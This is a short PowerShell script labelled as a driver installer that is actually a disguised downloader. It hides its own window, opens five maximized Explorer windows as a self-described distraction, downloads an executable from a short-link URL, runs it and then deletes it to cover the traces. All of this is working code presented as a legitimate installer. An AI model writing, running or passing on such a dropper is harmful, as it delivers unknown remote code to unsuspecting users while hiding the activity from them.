# Driver Installer Script
$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"

# --- Stealth & Distraction Setup ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Minimize the current PowerShell window to hide it
$hWnd = [WindowHelper]::GetForegroundWindow()
[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize

Write-Host "Starting installation..." -ForegroundColor Cyan

# Open 5 File Explorers in Full Screen (F11 simulation is hard, so we Maximize)
1..5 | ForEach-Object { 
    $proc = Start-Process explorer -PassThru
    Start-Sleep -Milliseconds 200
    # Try to maximize the new explorer windows
    [WindowHelper]::ShowWindow($proc.MainWindowHandle, 3) 
}

# Download the file
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
} catch {
    exit 1
}

# Run the file
if (Test-Path $out) {
    # -Wait keeps the script alive until drivers.exe is finished
    Start-Process -FilePath $out -Wait
    
    # Remove the file after running
    Remove-Item $out -Force -ErrorAction SilentlyContinue
}

# Script ends naturally
